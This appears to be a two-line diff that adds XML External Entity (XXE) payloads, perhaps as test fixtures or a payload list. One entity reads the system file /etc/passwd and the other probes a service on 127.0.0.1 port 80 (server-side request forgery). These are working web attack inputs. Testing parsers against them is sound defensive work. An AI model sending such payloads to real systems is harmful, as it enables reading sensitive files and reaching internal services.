@@ -1,0 +1,2 @@
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "http://127.0.0.1:80">]><r>&xxe;</r>
